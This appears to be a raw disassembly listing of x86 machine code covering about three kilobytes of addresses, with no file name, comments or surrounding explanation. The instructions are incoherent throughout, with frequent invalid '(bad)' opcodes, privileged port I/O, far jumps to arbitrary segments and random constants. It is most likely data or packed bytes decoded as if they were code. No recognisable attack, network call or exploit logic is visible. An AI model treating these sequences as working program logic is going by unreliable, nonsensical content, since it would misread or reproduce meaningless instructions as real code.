  4274b5:	add    BYTE PTR [eax-0x74],cl
  4274b8:	inc    ecx
  4274b9:	out    0x65,eax
  4274bb:	sbb    ebp,DWORD PTR [eax]
  4274bd:	xor    eax,0xdf9a087a
  4274c2:	(bad)  
  4274c3:	hlt    
  4274c4:	ja     0x42745b
  4274c6:	fsub   QWORD PTR [ebp-0x16]
  4274c9:	push   edi
  4274ca:	sub    al,ah
  4274cc:	mov    eax,ds:0x986281a6
  4274d1:	xchg   DWORD PTR [esi+ebp*8+0x6c7b1e05],esi
  4274d8:	leave  
  4274d9:	imul   ebx,DWORD PTR [ebx-0x20],0xfa2267d4
  4274e0:	adc    al,0xc5
  4274e2:	mov    eax,0x91c1955d
  4274e7:	inc    edi
  4274e8:	jge    0x4274a4
  4274ea:	ret    0xf7cd
  4274ed:	inc    esp
  4274ee:	mov    al,ds:0x14207349
  4274f3:	dec    ebx
  4274f4:	cmc    
  4274f5:	xchg   edi,eax
  4274f6:	je     0x427496
  4274f8:	fcmovb st,st(6)
  4274fa:	cs out dx,al
  4274fc:	mov    ds:0x24b1c18,eax
  427501:	iret   
  427502:	cmp    esp,DWORD PTR [edx+0x70dd7332]
  427508:	add    edx,DWORD PTR [edi-0x53]
  42750b:	mov    edi,0x46e99430
  427510:	sbb    al,BYTE PTR [edi]
  427512:	mov    ebx,0x4e670b2f
  427517:	ins    DWORD PTR es:[edi],dx
  427518:	and    dl,BYTE PTR [esi+0x50a7f8b2]
  42751e:	push   0x47
  427520:	enter  0x65f9,0xd4
  427524:	pop    eax
  427525:	cmp    DWORD PTR [esi],0xa846084c
  42752b:	mov    ch,0x2b
  42752d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42752e:	sbb    al,0x77
  427530:	rcl    BYTE PTR [ebp+0x638cd42c],1
  427536:	sub    eax,0xb30d3a73
  42753b:	mov    ch,0x9a
  42753d:	sbb    edx,DWORD PTR [ebp-0x7a]
  427540:	xchg   ecx,eax
  427541:	sbb    al,0x0
	...
  4275b3:	add    BYTE PTR [edx],dl
  4275b5:	retf   
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xf99a8b87,al
  4275c1:	sub    eax,0xa2da579b
  4275c6:	add    DWORD PTR [eax],eax
  4275c8:	test   BYTE PTR [eax],0x0
  4275cb:	add    BYTE PTR [esi+0x76],al
  4275ce:	push   0x989b5f0a
  4275d3:	add    al,BYTE PTR [eax-0x2c]
  4275d6:	adc    BYTE PTR [esi+0x4336bc86],0x97
  4275dd:	cs inc esp
  4275df:	mov    al,ah
  4275e1:	sbb    ecx,0x4c4ef3dd
  4275e7:	push   edx
  4275e8:	mov    ah,0xcf
  4275ea:	add    cl,BYTE PTR ds:0x7f6f0f69
  4275f0:	xor    BYTE PTR [ebx],0x76
  4275f3:	push   es
  4275f4:	xlat   BYTE PTR ds:[ebx]
  4275f5:	stos   DWORD PTR es:[edi],eax
  4275f6:	cmp    ch,BYTE PTR [edx-0x38e6309a]
  4275fc:	jmp    0xec96:0xf07fc48f
  427603:	shl    BYTE PTR [esp+edi*4+0x5],0x11
  427608:	stc    
  427609:	lods   eax,DWORD PTR ds:[esi]
  42760a:	loopne 0x427644
  42760c:	add    esp,DWORD PTR [ecx]
  42760e:	sar    BYTE PTR [edi],cl
  427610:	dec    edx
  427611:	push   edx
  427612:	adc    eax,0x1ab32fc5
  427617:	ret    
  427618:	or     dh,dh
  42761a:	inc    edx
  42761b:	fnstsw WORD PTR [esp+edx*4-0x41]
  42761f:	ficomp DWORD PTR [ebp+ebx*8-0x714673f0]
  427626:	pop    ecx
  427627:	jne    0x42765e
  427629:	icebp  
  42762a:	or     al,0x5a
  42762c:	daa    
  42762d:	pop    edi
  42762e:	addr16 lahf 
  427630:	mov    ds:0x9dede9b5,eax
  427635:	push   edi
  427636:	(bad)  
  427637:	cmp    BYTE PTR [eax+0x7e],al
  42763a:	dec    ebp
  42763b:	pop    edx
  42763c:	sbb    bh,BYTE PTR [eax+0x2672ba97]
  427642:	aaa    
  427643:	dec    eax
  427644:	not    DWORD PTR [ebp+0x1e]
  427647:	fisttp WORD PTR [edi-0x2b08bcd1]
  42764d:	aad    0xbb
  42764f:	sbb    al,0xe8
  427651:	repnz fucomp st(7)
  427654:	inc    ecx
  427655:	mov    ds:0x7be1d88,eax
  42765a:	shr    edx,1
  42765c:	gs das 
  42765e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42765f:	stc    
  427660:	sbb    esp,edx
  427662:	inc    ebp
  427663:	pop    esi
  427664:	add    BYTE PTR [esi-0x1a2eead],ah
  42766a:	mov    si,0x254
  42766e:	mov    bh,0xd0
  427670:	out    dx,al
  427671:	jge    0x42765b
  427673:	ret    0x30f5
  427676:	lea    ebx,[ebx+0x7]
  427679:	mov    ebp,0x9c2d82e
  42767e:	cs jge 0x4276ab
  427681:	lock fs jg 0x4276c0
  427685:	retf   
  427686:	test   eax,0x8c7acc15
  42768b:	mov    eax,0xd295801a
  427690:	enter  0xbb41,0xea
  427694:	ins    BYTE PTR es:[edi],dx
  427695:	push   esi
  427696:	(bad)  
  427698:	dec    ecx
  427699:	push   ebx
  42769a:	cmp    al,0x63
  42769c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42769d:	lahf   
  42769e:	sbb    cl,BYTE PTR [esi-0x2212f840]
  4276a4:	mov    ds:0x30123bb0,eax
  4276a9:	shl    DWORD PTR [ecx+0x3e2e4931],cl
  4276af:	jecxz  0x4276b9
  4276b1:	addr16 dec edx
  4276b3:	bound  esp,QWORD PTR ds:0xbe5a95ad
  4276b9:	push   ds
  4276ba:	outs   dx,DWORD PTR ds:[esi]
  4276bb:	adc    eax,0xac6a2a1a
  4276c0:	mov    ds:0x54,al
	...
  427731:	add    BYTE PTR [eax],al
  427733:	add    BYTE PTR [eax-0xd53173],bh
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	call   0xd125214b
  427745:	mov    ds:0xf60001,eax
  42774a:	add    BYTE PTR [eax],al
  42774c:	outs   dx,BYTE PTR ds:[esi]
  42774d:	test   dl,dh
  42774f:	mov    al,0xfd
  427751:	mov    eax,ds:0xc8ec7f88
  427756:	sbb    bh,BYTE PTR [ecx]
  427758:	mov    edi,0x596b399d
  42775d:	xchg   ebp,eax
  42775e:	loopne 0x42779e
  427760:	adc    ch,BYTE PTR [esi+0x39]
  427763:	mov    ebx,0x7e64ec2c
  427768:	outs   dx,DWORD PTR ds:[esi]
  427769:	sbb    BYTE PTR [ebx-0x79],dh
  42776c:	fsubr  QWORD PTR [edx]
  42776e:	ret    
  42776f:	cs aaa 
  427771:	mov    ebp,0xb3da3321
  427777:	xor    eax,0xaa96d711
  42777c:	inc    ecx
  42777d:	test   BYTE PTR [ebx+0x2bb77d43],bl
  427783:	outs   dx,DWORD PTR ds:[esi]
  427784:	or     eax,0x4e50e08c
  427789:	and    ch,bh
  42778b:	gs popf 
  42778d:	push   ecx
  42778e:	sub    BYTE PTR [eax],bh
  427790:	cdq    
  427791:	mov    ch,0xac
  427793:	jnp    0x427746
  427795:	push   esi
  427796:	or     DWORD PTR [ecx+0x594bccad],ebx
  42779c:	rcl    bl,0x4e
  42779f:	mov    edx,DWORD PTR [ebx]
  4277a1:	pusha  
  4277a2:	ss mov eax,0x2264941
  4277a8:	jmp    0x79eb9ba1
  4277ad:	in     eax,0x9
  4277af:	pop    esi
  4277b0:	fisttp DWORD PTR [ebp+eax*1+0x20]
  4277b4:	in     eax,0x24
  4277b6:	jne    0x427830
  4277b8:	cmp    esi,DWORD PTR [ebx-0xb]
  4277bb:	and    esp,ecx
  4277bd:	stc    
  4277be:	outs   dx,DWORD PTR ds:[esi]
  4277bf:	shl    dl,0xe7
  4277c2:	mov    ah,0x3b
  4277c4:	cmp    al,0x6d
  4277c6:	je     0x4277d7
  4277c8:	xchg   BYTE PTR [ecx],ah
  4277ca:	scas   eax,DWORD PTR es:[edi]
  4277cb:	daa    
  4277cc:	mov    edi,DWORD PTR [esi+esi*4-0x53a4342b]
  4277d3:	(bad)  
  4277d5:	or     eax,0xdd7683f9
  4277da:	out    dx,al
  4277db:	sar    DWORD PTR [esi-0x7d],0x41
  4277df:	push   ecx
  4277e0:	out    0xaa,eax
  4277e2:	or     dl,BYTE PTR [ebp+ecx*2-0x2b83dc08]
  4277e9:	aam    0x33
  4277eb:	js     0x427861
  4277ed:	rol    eax,cl
  4277ef:	push   ds
  4277f0:	mov    ebx,0x12f89530
  4277f5:	mov    esi,0x75d5f996
  4277fa:	enter  0x8588,0x31
  4277fe:	jne    0x4277cd
  427800:	inc    ebp
  427801:	mov    bh,0xba
  427803:	mov    eax,0xd201b42c
  427808:	rol    cl,0x25
  42780b:	inc    esp
  42780c:	mov    edx,0x20c7a0dd
  427811:	mov    ch,0x72
  427813:	fisttp DWORD PTR [eax]
  427815:	retf   0x93b9
  427818:	sub    ecx,ebx
  42781a:	imul   edx,DWORD PTR [ebp+0x25e1a049],0x64
  427821:	into   
  427822:	mov    al,ds:0x77690d06
  427827:	repz push eax
  427829:	cmp    ch,BYTE PTR [eax+0x6987c2c6]
  42782f:	xor    BYTE PTR [eax+0x39],0x55
  427833:	and    ah,dh
  427835:	or     eax,0xb396b33
  42783a:	les    edx,FWORD PTR [edi-0x16]
  42783d:	sahf   
  42783e:	retf   0xeee8
  427841:	lods   eax,DWORD PTR ds:[esi]
	...
  4278b2:	add    BYTE PTR [eax],al
  4278b4:	mov    WORD PTR [esi+0x7d],cs
  4278b7:	jge    0x4278b8
  4278b9:	jg     0x427847
  4278bb:	dec    DWORD PTR [eax-0x5e]
  4278be:	(bad)  
  4278bf:	xchg   ecx,eax
  4278c0:	test   eax,0xc60a0e5f
  4278c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c6:	add    DWORD PTR [eax],eax
  4278c8:	test   BYTE PTR [eax],0x0
  4278cb:	add    dh,bl
  4278cd:	jae    0x427887
  4278cf:	cmp    cl,ah
  4278d1:	sbb    al,0xaf
  4278d3:	adc    eax,0x6cf438c4
  4278d8:	in     al,dx
  4278d9:	and    DWORD PTR [ecx+0x1f],0x77097444
  4278e0:	push   0xac015134
  4278e5:	mov    ecx,0xccedf318
  4278ea:	jecxz  0x4278b2
  4278ec:	out    0x83,eax
  4278ee:	ret    
  4278ef:	inc    esi
  4278f0:	mov    dh,0x79
  4278f2:	pop    ds
  4278f3:	enter  0x3f6,0x87
  4278f7:	mov    eax,ds:0x95d9563e
  4278fc:	in     eax,dx
  4278fd:	mov    ecx,gs
  4278ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427900:	(bad)  
  427901:	ins    DWORD PTR es:[edi],dx
  427902:	mov    ebp,0xc7b7a16c
  427907:	mov    dh,0xf4
  427909:	cmp    bl,BYTE PTR [ebx-0x68]
  42790c:	mov    ebp,esp
  42790e:	imul   edi,DWORD PTR [ebx-0x5c],0xe338bcaf
  427915:	dec    ebp
  427916:	mov    esp,0xf6f26303
  42791b:	sub    esi,DWORD PTR [edi]
  42791d:	(bad)  
  42791e:	shl    DWORD PTR [ebx-0x52],cl
  427921:	pop    ds
  427922:	mov    ds:0xea5a8502,al
  427927:	mov    ah,0xff
  427929:	shl    BYTE PTR [edi+0x58],cl
  42792c:	inc    edx
  42792d:	div    edx
  42792f:	aaa    
  427930:	popf   
  427931:	and    ah,BYTE PTR [edx-0x7102f8d]
  427937:	lock dec esi
  427939:	daa    
  42793a:	les    ebp,FWORD PTR [ebx]
  42793c:	shr    DWORD PTR [edx+edx*8],1
  42793f:	test   DWORD PTR [edx+eax*2+0x4f],edi
  427943:	add    eax,0xc1c95ae7
  427948:	add    dl,dl
  42794a:	add    ah,BYTE PTR [eax]
  42794c:	push   eax
  42794d:	pop    esi
  42794e:	iret   
  42794f:	test   eax,0x4ac6feb2
  427954:	jns    0x427957
  427956:	retf   
  427957:	sbb    al,0x99
  427959:	sub    al,0x89
  42795b:	jae    0x4279d1
  42795d:	fisttp WORD PTR [bx]
  427960:	or     edi,DWORD PTR [esp+ebx*1+0x6c]
  427964:	and    al,0x36
  427966:	add    bh,al
  427968:	repz push edi
  42796a:	dec    ecx
  42796b:	mov    dh,0xad
  42796d:	or     esp,0xce19e5ef
  427973:	int    0x1f
  427975:	sbb    al,0x62
  427977:	out    0x9e,eax
  427979:	arpl   bp,bx
  42797b:	js     0x4279bc
  42797d:	push   DWORD PTR [esi+0x62]
  427980:	les    edx,FWORD PTR [ebp+0x65]
  427983:	imul   edi,DWORD PTR [eax+eiz*8+0x75e9650c],0xffffffa6
  42798b:	test   eax,0x7b3d1805
  427990:	or     esi,DWORD PTR [eax]
  427992:	(bad)  
  427993:	sar    ecx,cl
  427995:	push   0x4d
  427997:	xchg   ebx,eax
  427998:	pop    ss
  427999:	mov    ds:0xcdbb85ca,al
  42799e:	scas   al,BYTE PTR es:[edi]
  42799f:	and    BYTE PTR [eax],0x57
  4279a2:	sqrtps xmm1,xmm0
  4279a5:	push   es
  4279a6:	mov    esp,0xd905c469
  4279ab:	lahf   
  4279ac:	daa    
  4279ad:	cmp    eax,0x395438b
  4279b2:	dec    ebx
  4279b3:	and    BYTE PTR [ecx],ch
  4279b5:	lds    edx,FWORD PTR [edi+0x23]
  4279b8:	pop    esi
  4279b9:	add    ecx,DWORD PTR [ecx+0x40]
  4279bc:	xchg   BYTE PTR [edi+0x3d],cl
  4279bf:	stc    
  4279c0:	std    
  4279c1:	jno    0x4279c3
	...
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x24
  427a41:	rol    BYTE PTR [ebx-0x6e],cl
  427a44:	mov    esp,0xf60001a5
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [edx+eax*8],bl
  427a4e:	es mov eax,0x4b4d8df7
  427a54:	push   ss
  427a55:	loop   0x427a75
  427a57:	add    DWORD PTR [ecx],0xffffff86
  427a5a:	loopne 0x427ac3
  427a5c:	inc    ecx
  427a5d:	dec    esi
  427a5e:	ins    DWORD PTR es:[edi],dx
  427a5f:	ins    BYTE PTR es:[edi],dx
  427a60:	or     al,0x6d
  427a62:	push   0x4e86bc1e
  427a67:	bound  edi,QWORD PTR [eax+ecx*2]
  427a6a:	xor    BYTE PTR [ecx-0x64],dl
  427a6d:	inc    esi
  427a6e:	fs push ebx
  427a70:	popf   
  427a71:	and    BYTE PTR [esi-0x11],bl
  427a74:	push   eax
  427a75:	xor    esp,DWORD PTR gs:[esi+0xeea1695]
  427a7c:	popf   
  427a7d:	jno    0x427a9a
  427a7f:	add    DWORD PTR ss:[esi],eax
  427a82:	sbb    al,0xe
  427a84:	jae    0x427ac3
  427a86:	inc    esi
  427a87:	mov    ebp,0xabd1c6fc
  427a8c:	ret    0x1614
  427a8f:	call   0xe89b:0x57c04bbe
  427a96:	jnp    0x427b0c
  427a98:	xor    DWORD PTR [esi+0xc830616],ecx
  427a9e:	int3   
  427a9f:	pop    ebx
  427aa0:	aaa    
  427aa1:	shl    dh,cl
  427aa3:	add    eax,0x5833e9c3
  427aa8:	call   0xa4c8:0x552d27e
  427aaf:	stc    
  427ab0:	inc    eax
  427ab1:	pop    esp
  427ab2:	dec    DWORD PTR [edx+ebx*8]
  427ab5:	retf   0x1c5f
  427ab8:	outs   dx,BYTE PTR ds:[esi]
  427ab9:	daa    
  427aba:	aad    0xfb
  427abc:	mov    dl,BYTE PTR [ecx-0xc]
  427abf:	clc    
  427ac0:	out    0x94,al
  427ac2:	inc    ecx
  427ac3:	sbb    al,0xc9
  427ac5:	leave  
  427ac6:	in     al,0xb9
  427ac8:	mov    ecx,0xe4376a06
  427acd:	add    ch,bl
  427acf:	mov    ds:0x671e285,eax
  427ad4:	aam    0xe1
  427ad6:	xchg   esi,eax
  427ad7:	sub    BYTE PTR [ebx-0x17],ah
  427ada:	(bad)  
  427adb:	mov    ebx,edi
  427add:	mov    al,ds:0xe0d75bb6
  427ae2:	in     eax,dx
  427ae3:	mov    esp,DWORD PTR [ecx+0x57]
  427ae6:	shl    DWORD PTR [eax+edx*8+0x63],1
  427aea:	mov    edx,0x34e5769e
  427aef:	outs   dx,DWORD PTR ds:[esi]
  427af0:	ret    0xf8
  427af3:	stc    
  427af4:	jno    0x427b09
  427af6:	xor    al,0x6d
  427af8:	pop    ds
  427af9:	mov    al,ds:0xfbf2fff4
  427afe:	adc    al,0x57
  427b00:	adc    al,0x38
  427b02:	enter  0xe7aa,0x75
  427b06:	or     BYTE PTR [ebx+0x62],bl
  427b09:	dec    ebp
  427b0a:	enter  0x2cd9,0x82
  427b0e:	shl    DWORD PTR [ebx],0xd3
  427b11:	push   esi
  427b12:	or     ah,ah
  427b14:	sub    esi,ebx
  427b16:	aaa    
  427b17:	mov    ds:0xa4749849,eax
  427b1c:	lock pop eax
  427b1e:	push   es
  427b1f:	dec    ebp
  427b20:	enter  0x4257,0x3e
  427b24:	loop   0x427b4f
  427b26:	mov    al,0x7c
  427b28:	push   ecx
  427b29:	ret    
  427b2a:	mov    edx,0x16d7b158
  427b2f:	in     eax,dx
  427b30:	jmp    0x945a0456
  427b35:	xor    ch,bh
  427b37:	adc    DWORD PTR [edx],ebx
  427b39:	mov    DWORD PTR [eax+0x7b20b52f],esp
  427b3f:	dec    ebp
  427b40:	mov    dl,al
	...
  427bb2:	add    BYTE PTR [eax],al
  427bb4:	loop   0x427c16
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0xfa14fe65
  427bc1:	bound  esi,QWORD PTR [edi-0x3a]
  427bc4:	mov    dl,0xa6
  427bc6:	add    DWORD PTR [eax],eax
  427bc8:	test   BYTE PTR [eax],0x0
  427bcb:	add    BYTE PTR [edx+edx*1],dh
  427bce:	or     BYTE PTR [edi+0x1f],0x7d
  427bd2:	pushf  
  427bd3:	jecxz  0x427c27
  427bd5:	pop    ecx
  427bd6:	cld    
  427bd7:	jmp    0x427bba
  427bd9:	pop    esp
  427bda:	sub    BYTE PTR [edx],ch
  427bdc:	push   ebp
  427bdd:	cwde   
  427bde:	pop    ebx
  427bdf:	pop    eax
  427be0:	(bad)  
  427be1:	xlat   BYTE PTR ds:[ebx]
  427be2:	aas    
  427be3:	scas   al,BYTE PTR es:[edi]
  427be4:	fcos   
  427be6:	push   cs
  427be7:	(bad)  
  427be8:	(bad)  
  427be9:	cmp    ebp,DWORD PTR [edx+0x5c]
  427bec:	std    
  427bed:	mov    ecx,0x9a32d9ce
  427bf2:	not    BYTE PTR [esi]
  427bf4:	inc    ebx
  427bf5:	repz adc ebx,DWORD PTR [edx*4+0x39520c42]
  427bfd:	je     0x427c78
  427bff:	push   edi
  427c00:	mov    BYTE PTR [eax+ebx*8],cl
  427c03:	cmp    al,BYTE PTR [edx+0x28416071]
  427c09:	fldcw  WORD PTR [esi]
  427c0b:	retf   
  427c0c:	je     0x427bff
  427c0e:	ss dec esi
  427c10:	push   eax
  427c11:	nop
  427c12:	cdq    
  427c13:	clc    
  427c14:	push   cs
  427c15:	les    ebx,FWORD PTR [eax+esi*2]
  427c18:	inc    ebp
  427c19:	jg     0x427bf9
  427c1b:	vmread edx,edx
  427c1e:	dec    ebp
  427c1f:	jo     0x427c99
  427c21:	sub    DWORD PTR [edx+ecx*2-0x53],0xffffff91
  427c26:	sub    ah,BYTE PTR [eax+0x23abf4ff]
  427c2c:	js     0x427c7a
  427c2e:	jl     0x427caa
  427c30:	test   BYTE PTR [ebp+0x68],bh
  427c33:	inc    ecx
  427c34:	fwait
  427c35:	mov    WORD PTR ds:0x4dffb124,cs
  427c3b:	xchg   ebp,eax
  427c3c:	cmc    
  427c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c3e:	mov    edx,0x3585f1d2
  427c43:	cmp    edx,DWORD PTR [ebx+0xf]
  427c46:	imul   ebx,DWORD PTR [ebp+0x1cc14a78],0x52
  427c4d:	adc    bl,BYTE PTR [ebx+0x3987aea6]
  427c53:	popa   
  427c54:	and    eax,0x965a749e
  427c59:	mov    ebp,esp
  427c5b:	jmp    0x427bdf
  427c5d:	sbb    eax,0xe0eb5365
  427c62:	mov    dl,0x84
  427c64:	sti    
  427c65:	fmul   DWORD PTR gs:[edx+0x4e0b190]
  427c6c:	mov    ebx,0xaaf4acdd
  427c71:	sbb    eax,DWORD PTR es:[ebx+0x11]
  427c75:	stos   BYTE PTR es:[edi],al
  427c76:	imul   esi,DWORD PTR [edi+0x4c8b96a0],0x4e
  427c7d:	out    dx,al
  427c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c7f:	inc    edx
  427c80:	xchg   esp,eax
  427c81:	inc    ecx
  427c82:	mov    ax,ds:0xc858f955
  427c88:	dec    eax
  427c89:	pop    ebx
  427c8a:	pop    ecx
  427c8b:	ret    0x6704
  427c8e:	jb     0x427cbf
  427c90:	repz push ds
  427c92:	shl    DWORD PTR [esi-0x19c8d661],1
  427c98:	int    0x5c
  427c9a:	push   ecx
  427c9b:	(bad)  
  427c9c:	shl    BYTE PTR [ecx],cl
  427c9e:	inc    edx
  427c9f:	and    al,0x5
  427ca1:	push   es
  427ca2:	jg     0x427c7e
  427ca4:	(bad)  
  427ca6:	and    edi,ebp
  427ca8:	das    
  427ca9:	into   
  427caa:	mov    DWORD PTR [esi+0x45aceee5],0x4e5ec196
  427cb4:	xor    BYTE PTR [edi],al
  427cb6:	mov    edx,0x4f019f68
  427cbb:	dec    eax
  427cbc:	bound  ebp,QWORD PTR [ebx-0x75]
  427cbf:	and    edx,DWORD PTR [ecx-0x66]
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0xf1a1:0xdc63ecf9
  427d41:	fs dec ebp
  427d43:	shr    BYTE PTR [eax-0x9fffe59],cl
  427d49:	add    BYTE PTR [eax],al
  427d4b:	add    BYTE PTR [edx],bl
  427d4d:	xor    eax,0x8f79e53
  427d52:	mov    al,0x6b
  427d54:	std    
  427d55:	dec    edx
  427d56:	outs   dx,DWORD PTR ds:[esi]
  427d57:	out    dx,eax
  427d58:	mov    edi,0x9699fad0
  427d5d:	and    eax,0x3f57835f
  427d63:	xchg   esi,eax
  427d64:	in     eax,dx
  427d65:	jmp    0x473f:0x4346a092
  427d6c:	jno    0x427da6
  427d6e:	add    eax,0xab9c959d
  427d73:	dec    ebp
  427d74:	dec    ecx
  427d75:	mov    BYTE PTR [edi+ecx*8+0xf],dh
  427d79:	inc    edx
  427d7a:	push   esi
  427d7b:	mov    ?,WORD PTR [ecx]
  427d7d:	shl    BYTE PTR [edi-0x1a44ab6c],0xe9
  427d84:	jge    0x427db2
  427d86:	jmp    0x427d4c
  427d88:	inc    eax
  427d89:	jns    0x427d99
  427d8b:	or     BYTE PTR [ebp-0x34],ch
  427d8e:	pop    ebx
  427d8f:	(bad)  
  427d90:	pop    eax
  427d91:	loope  0x427d79
  427d93:	lea    esi,[ebx+0x63]
  427d96:	sbb    eax,0x371dc271
  427d9b:	int3   
  427d9c:	jl     0x427d2f
  427d9e:	in     al,dx
  427d9f:	mov    DWORD PTR [esi],edi
  427da1:	xchg   esi,eax
  427da2:	cmp    BYTE PTR [esi],ah
  427da4:	shl    BYTE PTR [ebx+edx*8-0x2b],0xb8
  427da9:	call   DWORD PTR [eax-0x1e]
  427dac:	fisttp DWORD PTR [esi+edx*2+0x6e]
  427db0:	add    eax,0x58b846c3
  427db5:	pop    eax
  427db6:	mov    ds:0xad5e56ff,al
  427dbb:	cld    
  427dbc:	shr    DWORD PTR [edx+0x210e9d01],cl
  427dc2:	test   BYTE PTR [edi],bh
  427dc4:	sub    eax,0x640810a3
  427dc9:	scas   al,BYTE PTR es:[edi]
  427dca:	sahf   
  427dcb:	dec    edi
  427dcc:	cmp    bl,BYTE PTR [esi]
  427dce:	mov    DWORD PTR ds:0x4ca7d19f,esp
  427dd4:	or     BYTE PTR [ebx],0x8b
  427dd7:	xor    eax,0x37d3fe39
  427ddc:	xchg   edi,eax
  427ddd:	adc    al,0xd8
  427ddf:	pop    esi
  427de0:	stos   BYTE PTR es:[edi],al
  427de1:	and    edi,edi
  427de3:	jae    0x427e10
  427de5:	push   cs
  427de6:	mov    eax,0x8dd6ce2
  427deb:	push   0x52
  427ded:	inc    esi
  427dee:	sbb    al,0xcb
  427df0:	xor    eax,0xe2a71de0
  427df5:	jns    0x427daf
  427df7:	mov    ebx,0x8d77fcda
  427dfc:	sahf   
  427dfd:	out    0xbc,eax
  427dff:	pop    ds
  427e00:	fwait
  427e01:	jnp    0x427d98
  427e03:	daa    
  427e04:	into   
  427e05:	xchg   edi,eax
  427e06:	xchg   ebx,eax
  427e07:	mov    edx,0xaf0425e7
  427e0c:	xchg   ecx,eax
  427e0d:	fldcw  WORD PTR [ebx+0x7a0ac67c]
  427e13:	or     ebx,DWORD PTR [ebp-0x41841e16]
  427e19:	mov    eax,0x9e2203e
  427e1e:	sbb    DWORD PTR [ebp-0x4d4194c5],esi
  427e24:	xchg   DWORD PTR [ecx-0x1b],ecx
  427e27:	addr16 je 0x427e26
  427e2a:	inc    ebx
  427e2b:	stos   DWORD PTR es:[edi],eax
  427e2c:	(bad)  
  427e2e:	cmp    esi,esp
  427e30:	pop    ecx
  427e31:	imul   eax,ebx,0xffffffba
  427e34:	push   edi
  427e35:	or     al,0x95
  427e37:	jb     0x427dd5
  427e39:	jmp    0xdb63acbe
  427e3e:	jmp    0x427de5
  427e40:	sbb    BYTE PTR fs:[eax],al
	...
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	stos   BYTE PTR es:[edi],al
  427ec1:	push   es
  427ec2:	popa   
  427ec3:	jmp    0xf6:0x1a89e
  427eca:	add    BYTE PTR [eax],al
  427ecc:	js     0x427ef5
  427ece:	jno    0x427e99
  427ed0:	cmp    DWORD PTR [eax-0x1b],edx
  427ed3:	sbb    dh,ah
  427ed5:	push   ecx
  427ed6:	inc    ecx
  427ed7:	jmp    0x55bb72f9
  427edc:	(bad)  
  427edd:	xchg   edx,eax
  427ede:	mov    ebp,0xe6468607
  427ee3:	cmc    
  427ee4:	test   eax,0x5a7b55ca
  427ee9:	pop    es
  427eea:	xlat   BYTE PTR ds:[ebx]
  427eeb:	(bad)  
  427eec:	out    0x42,eax
  427eee:	(bad)  [ebx+esi*2]
  427ef2:	mov    esp,0xa89ad9e3
  427ef7:	inc    eax
  427ef8:	or     dl,al
  427efa:	fld    st(4)
  427efc:	cs mov ah,0x5d
  427eff:	mov    eax,0x7ef67a4f
  427f04:	lahf   
  427f05:	sar    DWORD PTR [esi+0x63],cl
  427f08:	outs   dx,DWORD PTR ds:[esi]
  427f09:	xlat   BYTE PTR ds:[ebx]
  427f0a:	mov    bl,BYTE PTR [ecx+0x4b4513cd]
  427f10:	dec    cl
  427f12:	lds    edi,FWORD PTR [edx]
  427f14:	sahf   
  427f15:	jns    0x427f4a
  427f17:	stos   DWORD PTR es:[edi],eax
  427f18:	loopne 0x427f26
  427f1a:	or     edi,esp
  427f1c:	int    0xe7
  427f1e:	in     eax,dx
  427f1f:	mov    edx,0xe83abcd1
  427f24:	dec    ebp
  427f25:	push   edx
  427f26:	sub    bh,BYTE PTR [edi+edx*1+0x69]
  427f2a:	pop    ecx
  427f2b:	pop    ebx
  427f2c:	cmp    BYTE PTR [ebp-0x17],dh
  427f2f:	pop    ebp
  427f30:	leave  
  427f31:	inc    ebx
  427f32:	jb     0x427efc
  427f34:	and    eax,0x170ab06e
  427f39:	inc    edi
  427f3a:	mov    al,0x80
  427f3c:	lahf   
  427f3d:	xchg   ebx,eax
  427f3e:	sbb    BYTE PTR ds:[ecx+0x26],dl
  427f42:	push   ecx
  427f43:	mov    ecx,0xc2aeeab9
  427f48:	aam    0xd
  427f4a:	cmp    DWORD PTR [edx-0x2a],ebp
  427f4d:	loopne 0x427f40
  427f4f:	dec    esi
  427f50:	inc    eax
  427f51:	mov    ebp,0xec4810a2
  427f56:	jmp    0xdda0:0xd3c46d3a
  427f5d:	jno    0x427f83
  427f5f:	jno    0x427f3f
  427f61:	jmp    0x427f76
  427f63:	cmp    DWORD PTR [ecx],ebx
  427f65:	call   0xf6a82717
  427f6a:	cmc    
  427f6b:	sub    dl,BYTE PTR [edx+ebp*4+0x32]
  427f6f:	ds sub al,0xbe
  427f72:	and    al,0x84
  427f74:	mov    bl,BYTE PTR [edx-0x45]
  427f77:	dec    edx
  427f78:	cmp    dl,BYTE PTR [eax]
  427f7a:	inc    esi
  427f7b:	adc    bl,BYTE PTR [ecx+eax*8-0x38ed958b]
  427f82:	push   ds
  427f83:	icebp  
  427f84:	cmp    ch,al
  427f86:	push   ebx
  427f87:	in     al,dx
  427f88:	sbb    al,BYTE PTR [ecx+0x34]
  427f8b:	add    eax,0x9eaa81ad
  427f90:	ss pop esp
  427f92:	shr    DWORD PTR [esi-0x2af5a901],1
  427f98:	mov    WORD PTR [esi+0x509cce5e],cs
  427f9e:	push   edi
  427f9f:	pop    es
  427fa0:	and    eax,0x37ab0c31
  427fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fa6:	inc    edx
  427fa7:	lods   eax,DWORD PTR ds:[esi]
  427fa8:	jno    0x427f6e
  427faa:	and    ebp,edi
  427fac:	stos   BYTE PTR es:[edi],al
  427fad:	cwde   
  427fae:	mov    al,0xd9
  427fb0:	pop    esp
  427fb1:	jne    0x428013
